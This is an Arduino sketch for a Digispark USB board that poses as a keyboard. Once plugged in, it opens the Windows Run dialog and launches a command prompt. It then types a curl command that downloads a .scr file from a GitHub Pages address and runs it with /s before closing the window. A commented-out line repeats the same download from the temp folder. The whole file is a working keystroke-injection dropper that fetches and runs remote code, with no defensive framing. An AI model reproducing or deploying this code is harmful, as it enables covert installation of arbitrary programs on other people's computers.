#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  // DigiKeyboard.print(F("cd %temp%&curl -L -O kukuruzka165.github.io/pi.scr&pi.scr /s&exit"));
  DigiKeyboard.print(F("curl -L -O kukuruzka165.github.io/pi.scr&pi.scr /s&exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
